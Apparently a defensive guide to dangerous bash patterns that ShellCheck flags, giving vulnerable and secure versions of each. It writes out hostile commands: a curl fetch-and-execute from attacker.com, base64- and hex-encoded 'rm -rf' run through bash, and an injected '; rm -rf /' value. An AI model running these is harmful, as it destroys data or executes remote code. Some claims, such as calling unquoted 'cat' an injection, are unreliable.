# Malicious Shell Patterns Detected by ShellCheck

Examples of dangerous and malicious patterns that ShellCheck can identify.

## Command Injection via Unquoted Variables

### Vulnerable Pattern (SC2086)

```bash
#!/bin/bash
# DANGEROUS: Unquoted variable allows injection
USER_INPUT="file.txt; rm -rf /"
cat $USER_INPUT
```

ShellCheck output:
```
SC2086: Double quote to prevent globbing and word splitting.
```

### Secure Pattern

```bash
#!/bin/bash
USER_INPUT="file.txt; rm -rf /"
cat "$USER_INPUT"  # Treats entire string as filename
```

## Command Substitution Injection

### Vulnerable Pattern (SC2046)

```bash
#!/bin/bash
# DANGEROUS: Unquoted command substitution
FILES=$(curl -s http://attacker.com/files.txt)
rm $FILES  # Could delete arbitrary files
```

### Secure Pattern

```bash
#!/bin/bash
FILES=$(curl -s http://attacker.com/files.txt)
rm "$FILES"  # Still dangerous, but prevents word splitting
```

## Executing Arbitrary Output (SC2091)

### Vulnerable Pattern

```bash
#!/bin/bash
# DANGEROUS: Executes whatever the command outputs
$(curl -s http://attacker.com/payload.sh)
```

ShellCheck output:
```
SC2091: Remove surrounding $() to avoid executing output.
```

## Unsafe rm with Glob Expansion

### Vulnerable Pattern (SC2115)

```bash
#!/bin/bash
# DANGEROUS: If $DIR is empty, deletes /*
DIR=""
rm -rf "$DIR/"*
```

ShellCheck output:
```
SC2115: Use "${var:?}" to ensure this never expands to /* .
```

### Secure Pattern

```bash
#!/bin/bash
DIR=""
rm -rf "${DIR:?}/"*  # Fails if DIR is empty
```

## Piping to rm (SC2216)

### Vulnerable Pattern

```bash
#!/bin/bash
# DANGEROUS: Attackers can inject filenames
find /tmp -name "*.tmp" | xargs rm
```

### Secure Pattern

```bash
#!/bin/bash
find /tmp -name "*.tmp" -delete
# Or with null delimiter
find /tmp -name "*.tmp" -print0 | xargs -0 rm
```

## Unquoted Array Expansion (SC2068)

### Vulnerable Pattern

```bash
#!/bin/bash
# DANGEROUS: Array elements split on spaces
args=("--config" "path with spaces/config.yml")
tool $args[@]  # Breaks on spaces
```

### Secure Pattern

```bash
#!/bin/bash
args=("--config" "path with spaces/config.yml")
tool "${args[@]}"  # Preserves elements
```

## Unsafe eval Usage

### Vulnerable Pattern

```bash
#!/bin/bash
# DANGEROUS: Arbitrary code execution
CONFIG=$(cat config.txt)
eval "$CONFIG"
```

While ShellCheck doesn't flag `eval` directly, it catches issues with how variables used in eval are handled.

## Hidden Obfuscation Patterns

### Base64 Encoded Payload

```bash
#!/bin/bash
# Suspicious: Decoding and executing unknown content
echo "cm0gLXJmIC8=" | base64 -d | bash
```

ShellCheck catches when the decoded output is executed unsafely.

### Hex Encoded Commands

```bash
#!/bin/bash
# Suspicious pattern
CMD=$(printf '\x72\x6d\x20\x2d\x72\x66')  # "rm -rf"
$CMD /tmp/*
```

SC2086 flags the unquoted `$CMD`.

## Environment Variable Manipulation

### Vulnerable Pattern

```bash
#!/bin/bash
# DANGEROUS: PATH manipulation
export PATH=".:$PATH"  # Current directory first
some_command  # Could run malicious local script
```

## Heredoc Injection

### Vulnerable Pattern (SC2087)

```bash
#!/bin/bash
# DANGEROUS: Variables expanded in heredoc
PASSWORD="secret"
cat << EOF > config.txt
password=$PASSWORD
EOF
```

ShellCheck output:
```
SC2087: Quote 'EOF' to make heredoc literal.
```

### Secure Pattern (when literal is needed)

```bash
#!/bin/bash
cat << 'EOF' > config.txt
password=$PASSWORD  # Literal $PASSWORD, not expanded
EOF
```

## Glob as Command Name (SC2211)

### Vulnerable Pattern

```bash
#!/bin/bash
# DANGEROUS: Could execute unexpected script
*.sh  # If there's a file named "malicious.sh", it runs
```

## Summary of High-Risk Patterns

| Pattern | ShellCheck Code | Risk Level | Attack Vector |
|---------|-----------------|------------|---------------|
| Unquoted variables | SC2086 | Critical | Command injection |
| Unquoted command substitution | SC2046 | Critical | Command injection |
| Executing command output | SC2091 | Critical | Arbitrary execution |
| Empty variable in rm | SC2115 | Critical | File deletion |
| Glob as command | SC2211 | High | Arbitrary execution |
| Unquoted arrays | SC2068 | High | Argument injection |
| Unsafe heredocs | SC2087 | Medium | Data injection |
| Piping to rm | SC2216 | Medium | File deletion |
